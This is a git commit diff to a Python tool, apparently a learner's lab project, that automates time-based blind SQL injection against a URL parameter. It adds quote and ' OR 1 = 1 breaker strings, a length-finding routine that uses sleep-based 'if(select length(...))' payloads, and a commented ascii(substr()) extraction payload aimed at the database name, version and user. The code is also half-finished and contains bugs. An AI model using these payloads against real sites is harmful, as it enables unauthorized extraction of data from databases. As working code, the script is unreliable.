f427ab0962dad410a75b5b42896a4893aebde1a3
BluberryPickle <milinddinesh@gmail.com>
2021-07-08 01:56:28 +0530

    added function to find length

--- sqli automation/fun.py
+++ sqli automation/fun.py
@@ -2,9 +2,9 @@
 
 import requests
 from requests.models import parse_url
-import itertools
+from itertools import count
 
-def escape(url,param,list = ["\\",",","'","#","/",'"','.',"' OR 1 = 1"]) :      #code to find the break to break query.
+def escape(url,param,list = ["'",'"',')','")',"')","' OR 1 = 1",'" OR 1 = 1',"\\",",","#","/",'.']) :      #code to find the char to break query.
     
     char = []
     print("Trying to break the query...")
@@ -14,27 +14,48 @@ def escape(url,param,list = ["\\",",","'","#","/",'"','.',"' OR 1 = 1"]) :      
         t = r.elapsed.total_seconds()
         if t > 1.5 :
             char.append(i)
+            break
 
     if not char : #checks if the char array is empty or not
         print("Unable to break query with default character set.")
         option = input("Do you want to try out your own character set? [y/n]")
-        if option.lower() == 'y' :
-            num = input("Enter number of characters you want to enter : ")
-            print("Enter characters : ")
-            for i in range(num) :
-                list.append(input())
+        state = 1
+        newchar = []
+        while (state == 1 ) :
+            if option.lower() == 'y' :
+                state = 0
+                num = input("Enter number of characters you want to enter : ")
+                print("Enter characters : ")
+                for i in range(num) :
+                    newchar.append(input())
             
-            escape(url,param,list) #recursive function with the updated list of characters
+                escape(url,param,newchar) #recursive function with the new list of characters
+
+            elif option.lower() == 'n':
+                state = 0
 
     return char
 
+#function to find the length of information
+def len_find(char,param,fun,url) :
+    i = 0
+    state = 1
+    while state == 1 :
+        payload = url+"?"+param+"=1"+char+" AND if((select length("+fun+") = "+str(i)+"),sleep(7),null) --+"
+        r = requests.get(payload)
+        t = r.elapsed.total_seconds()
+        if t > 7 :
+            state = 0
+            return i
+        else : i += 1 
+
 #Function to bruteforce information from the database
-def bruteforce():
+def bruteforce(char,param,url):
     functions = ['database()','version(),user()']
     for f in functions :
-        payload = "?id=1' and if (("+f+")=\"security\", sleep(5),\"null\"); --+"
+        length = len_find(char,param,f,url)
+        c = count()
+        payload = url+"?"+param+"=-1"+char+" and if ((select "+f+")=\"security\", sleep(5),null); --+"
+        #?id=1' AND if(((ascii(substr((select database()),1,1))) = 56),sleep(5),null) --+
     print(payload)
 
-
-""" def len_find() :
-    payload =  """
